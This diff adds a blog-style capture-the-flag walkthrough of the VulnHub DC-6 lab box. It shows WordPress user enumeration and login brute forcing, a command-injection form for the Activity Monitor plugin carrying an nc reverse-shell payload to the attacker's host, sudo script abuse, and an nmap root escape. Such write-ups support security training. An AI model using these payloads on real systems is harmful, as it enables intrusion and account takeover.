@@ -1,0 +1,373 @@
+I"�;<p>DC-6 was a medium box. First, we add the domain name in the host file to access the website. Using wpscan we find out WordPress users. We Bruteforce and log in to WordPress. With a vulnerable plugin, we get the shell on the box. After pivoting to another user with the credentials found in the things-to-do.txt, we can run <code class="language-plaintext highlighter-rouge">nmap</code> as root with Sudo and spawn a shell as root.</p>
+
+<h1 id="summery">Summery</h1>
+
+<ul>
+  <li>Portscan</li>
+  <li>Add domain to host file</li>
+  <li>Finding users in wordpress</li>
+  <li>Generating Password file</li>
+  <li>Bruteforce</li>
+  <li>Login to wordpress</li>
+  <li>Exploiting vulnerable plugin.</li>
+  <li>Finding Credentials</li>
+  <li>SSH to box</li>
+  <li>SUDO rights</li>
+  <li>Exploiting Nmap</li>
+  <li>Root access</li>
+  <li>The Flag</li>
+</ul>
+
+<h1 id="portscan">Portscan</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>Nmap scan report for 192.168.1.7
+Host is up (0.00020s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
+|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
+|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to http://wordy/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h1 id="website">Website</h1>
+<p>When we browse the website with its IP address, it redirects us to <code class="language-plaintext highlighter-rouge">wordy</code> so I will add this domain name to my local host file i.e <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and use the hostname instead.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	parrot
+
+#vulnhub
+192.168.1.7     wordy
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We discovered the webpage got a WordPress CMS installed on it.
+<img src="/assets/img/dc-6/mainpage.png" alt="mainpage" /></p>
+
+<h2 id="finding-users">Finding users</h2>
+
+<p>I run <code class="language-plaintext highlighter-rouge">wpscan</code> to enumerate WordPress site. As a result, I found 4 users.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre>$wpscan --url http://wordy -eu
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] jens
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] graham
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] mark
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] sarah
+ | FoundBy: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="genrating-password-list">Genrating Password list.</h2>
+<p>The author of the box DCAU gave the clue on <a href="https://www.vulnhub.com/entry/dc-6,315/">website</a>.
+<img src="/assets/img/dc-6/clue.png" alt="clue" />
+ Let’s use it to generate password file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h2 id="bruteforce">Bruteforce</h2>
+<p>Now we have usernames and passwords, use this to bruteforce WordPress.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre>$wfuzz -c --hc=200 -z file,users.txt -z file,password.txt -d 'log=FUZZ&amp;pwd=FUZ2Z&amp;wp-submit=Log+In' http://wordy/wp-login.php
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://wordy/wp-login.php
+Total requests: 13340
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                               
+===================================================================
+
+000009879:   302        0 L      0 W      0 Ch        "mark - helpdesk01"                                                   
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Great, we got the password of the user <code class="language-plaintext highlighter-rouge">mark</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>username : mark
+passworc : helpdesk01
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Use this password to access wordpress.
+<img src="/assets/img/dc-6/wordpress.png" alt="wordpress" /></p>
+
+<h2 id="exploting-wordpress-plugin">Exploting wordpress plugin</h2>
+<p>We can see a plugin <code class="language-plaintext highlighter-rouge">Activity monitor</code>. 
+<img src="/assets/img/dc-6/activitymonitor.png" alt="active monitor" />
+There is an exploit available for this plugin you can check <a href="https://www.exploit-db.com/exploits/45274">here</a>. This plugin is vulnerable to OS command injection.</p>
+
+<p>We have to modify our POST request in order to make it work.</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"ip"</span> <span class="na">value=</span><span class="s">"google.fr| nc 192.168.1.2 4444 -e /bin/bash"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"lookup"</span> <span class="na">value=</span><span class="s">"Lookup"</span> <span class="nt">/&gt;</span>
+      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Save the above file with .html extension and through the browser navigate into the html file by setting python http server.</p>
+
+<p><img src="/assets/img/dc-6/submit.png" alt="htmlfile" /></p>
+
+<p>Setup listener and by clicking button we get shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]
+└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.1.2] from (UNKNOWN) [192.168.1.7] 54436
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@dc-6:/var/www/html/wp-admin$ ^Z
+[1]+  Stopped                 nc -nvlp 4444
+┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]
+└──╼ $stty raw -echo 
+┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]
+└──╼ $nc -nvlp 4444
+
+www-data@dc-6:/var/www/html/wp-admin$ export TERM=xterm
+www-data@dc-6:/var/www/html/wp-admin$ 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h1 id="escalating-to-user-graham">Escalating to user graham</h1>
+<p>In home directory of user mark I find out <code class="language-plaintext highlighter-rouge">things-to-do.txt</code>. This file contains password of user <code class="language-plaintext highlighter-rouge">graham</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt 
+Things to do:
+
+- Restore full functionality for the hyperdrive (need to speak to Jens)
+- Buy present for Sarah's farewell party
+- Add new user: graham - GSo7isUM1D4 - done
+- Apply for the OSCP course
+- Buy new laptop for Sarah's replacement
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>username : graham
+password : GSo7isUM1D4
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Port 22 is open for ssh and here I try to connect with ssh using creds. Then checked the sudoers list and found that graham can run <code class="language-plaintext highlighter-rouge">/home/jens/backups.sh</code> as jens without a password.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>graham@dc-6:~$ sudo -l
+Matching Defaults entries for graham on dc-6:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User graham may run the following commands on dc-6:
+    (jens) NOPASSWD: /home/jens/backups.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>I checked <code class="language-plaintext highlighter-rouge">backups.sh</code> and we can edit this file. Edit this file and get shell as jens.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>graham@dc-6:~$ cat /home/jens/backups.sh 
+#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+graham@dc-6:~$ vi /home/jens/backups.sh 
+graham@dc-6:~$ cat /home/jens/backups.sh 
+#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+/bin/bash
+graham@dc-6:~$ sudo -u jens /home/jens/backups.sh 
+jens@dc-6:/home/graham$
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Now we successfully login as jeans.
+Again I checked the sudoers list and found that jens can run <code class="language-plaintext highlighter-rouge">/usr/bin/nmap</code> as root without a password.
+Looking at <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>, I see as easy way to get a shell as root.
+<img src="/assets/img/dc-6/gtfobins.png" alt="gtfobins" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>jens@dc-6:~$ TF=$(mktemp)
+jens@dc-6:~$ echo 'os.execute("/bin/sh")' &gt; $TF
+jens@dc-6:~$ sudo /usr/bin/nmap --script=$TF
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-01 21:26 AEST
+NSE: Warning: Loading '/tmp/tmp.SOPgLECyvv' -- the recommended file extension is '.nse'.
+#bash
+root@dc-6:~# 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="the-flag">The flag</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>root@dc-6:~# 
+
+Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
+   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
